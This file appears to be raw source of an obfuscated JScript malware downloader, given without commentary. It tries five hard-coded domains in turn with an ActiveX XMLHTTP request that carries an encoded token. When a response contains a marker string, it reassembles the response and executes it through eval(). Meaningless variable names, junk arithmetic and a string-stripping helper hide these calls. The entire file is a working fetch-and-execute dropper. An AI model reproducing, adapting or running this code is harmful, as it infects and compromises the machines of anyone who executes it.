function zulum(pikue) {pikue.send();}
var x = ["modx.mbalet.ru","www.gloszp.pl","goldwingclub.ru","amis-spb.ru","elita5.md"];
var robs = 20-20;
var mumik = new Array('GET','JIJINGER');
var mustafa = x.length;
while(true)
{
	if(robs>=mustafa)
	{
		break;
	}
	try
	{		
		var joseph = new ActiveXObject(akrim("MSXML2.XAAMAALHTTP"));
		var zemk = '00000001gMdVGtsrSSXdeXdM7QqHhHFr6hZUXPFy01292600MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAhxk9W1y1YKQdWp3r5oS1oM0csV3rm9i_4cS9A_rLBls6pxEVTzT8XeBenFkZhem6l4VBJtd_s9Tz7QfiX1e_-BxZAMYPKySyfBNYyqJPfWpovedy5Uk-krG8nCZVMJps0TJVrZP5sloW537EqyEwF_9O2XC72YlpD9POKES3BlmTN1ln2ydVLSW-35m2NJ-yQf9Xbw7XnvAwzQb8bkXOgeZWA-olW_qPxX0BBIgR3atjAfQSHQAtIEQ5VM5JHD4-sGva_CrWQb5Rh__5MyeY9uUEbbQEqr_MyUGUnEinKGb4JOLVdTpzjS_AFgB-rDLBbBKnJanTrktPJuwXNM9G3wIDAQABzXH68BCv_z6LBkhllLYeHYJ1mdS1mbBjRs03sO9f-o4AI75H5uMQiHaR5d18Ulp0VPtPfFfSknaTnR7IUD5eIPngn1P3o4cwKA0';
		var ghyt = false;
		var gerlk = x[robs];		
		var ruxk = 'ae4acdfe070a2a09caa85d965e87a249';
		joseph.open(mumik[2-2], "http://"+gerlk+'/'+greezno()+'?'+zemk, ghyt);
		zulum(joseph);
		var gt = joseph.responseText;
		var miffka = gt.indexOf(ruxk);
		var pista = gt.length;
		var miluoki = "a";
		if ((pista+0) > (8+1+1) * 100 && 2 == 2) 
		{
			if (miffka + 3 > 2)
			{
				var gusar = rizma(gt, ruxk).join(miluoki+"");
				hust(gusar);
				break;
			}
		}
	}
	catch(e)
	{
	};
	robs++;
};
function malysh() {return akrim("htAAtp");}
function rizma(kjg, lki) {	return kjg.split(lki);}
function greezno() {return akrim('counAAter');}
function hust(gulibator){eval(gulibator);}
function akrim(grigam,podol){return grigam.replace(/AA/g,"");}